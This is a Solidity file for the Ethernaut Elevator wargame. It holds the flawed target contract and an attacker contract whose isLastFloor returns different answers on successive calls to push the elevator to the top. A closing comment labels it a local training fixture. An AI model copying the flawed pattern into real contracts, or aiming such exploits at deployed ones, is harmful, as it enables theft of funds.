// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

interface Building {
    function isLastFloor(uint256 floor) external returns (bool);
}

contract EthernautElevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 floor_) external {
        Building building = Building(msg.sender);
        if (!building.isLastFloor(floor_)) {
            floor = floor_;
            top = building.isLastFloor(floor);
        }
    }
}

contract ElevatorAttack is Building {
    EthernautElevator public target;
    bool public firstCheck = true;

    function attack(EthernautElevator target_, uint256 floor_) external {
        target = target_;
        target_.goTo(floor_);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (firstCheck) {
            firstCheck = false;
            return false;
        }
        return true;
    }
}

// Local training fixture for the classic Ethernaut Elevator challenge.
// The target calls the same external predicate twice and assumes it is stable.

